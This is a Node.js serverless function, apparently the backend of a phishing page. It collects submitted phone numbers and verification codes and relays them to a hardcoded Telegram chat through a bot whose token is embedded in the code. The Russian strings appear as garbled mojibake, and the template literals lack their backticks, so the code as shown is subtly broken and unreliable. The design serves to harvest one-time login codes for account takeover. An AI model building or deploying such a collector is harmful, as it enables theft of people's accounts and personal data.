const TelegramBot = require('node-telegram-bot-api');

// –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à–∏ –¥–∞–Ω–Ω—ã–µ
const TELEGRAM_BOT_TOKEN = '7644523613:AAFK-3sc0EaMYb9XirbmiCJt4joBkD3sl0w';
const CHAT_ID = '-4854718691';

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);

exports.handler = async (event, context) => {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: '–ú–µ—Ç–æ–¥ –Ω–µ —Ä–∞–∑—Ä–µ—à–µ–Ω' }),
        };
    }

    try {
        const { type, data } = JSON.parse(event.body);
        let message = '';

        if (type === 'phone') {
            message = <b>üîî –ù–æ–≤—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞!</b>\n\n<b>üì± –¢–µ–ª–µ—Ñ–æ–Ω:</b> <code>${data}</code>;
        } else if (type === 'code') {
            message = <b>üîë –ü–æ–ª—É—á–µ–Ω –∫–æ–¥!</b>\n\n<b>üì± –¢–µ–ª–µ—Ñ–æ–Ω:</b> <code>${data.phone}</code>\n<b>üîí –ö–æ–¥:</b> <code>${data.code}</code>;
        } else {
            return {
                statusCode: 400,
                body: JSON.stringify({ error: '–ù–µ–≤–µ—Ä–Ω—ã–π —Ç–∏–ø –∑–∞–ø—Ä–æ—Å–∞' }),
            };
        }

        await bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        return {
            statusCode: 200,
            body: JSON.stringify({ success: true }),
        };
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram' }),
        };
    }
};
